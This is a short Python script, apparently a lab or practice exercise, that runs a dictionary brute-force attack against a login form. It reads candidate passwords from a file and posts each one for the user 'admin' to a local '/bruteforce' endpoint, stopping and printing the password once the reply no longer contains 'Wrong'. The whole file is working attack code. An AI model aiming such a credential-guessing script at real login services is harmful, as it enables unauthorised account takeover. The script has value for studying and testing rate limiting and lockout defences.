import json
from requests import post as POST

URL = 'http://127.0.0.1:5000/bruteforce'


def famous_passwords():
    with open('dictionary.txt', 'r') as f:
        all_password = f.read().split('\n')
    return all_password

if __name__ == '__main__':
    success = False
    for guess_password in famous_passwords():
        response = POST(URL, data={'username': 'admin', 'password': str(guess_password)})
        success = "Wrong" in response.text
        if not success:
            print(f'Password is {guess_password}')
            break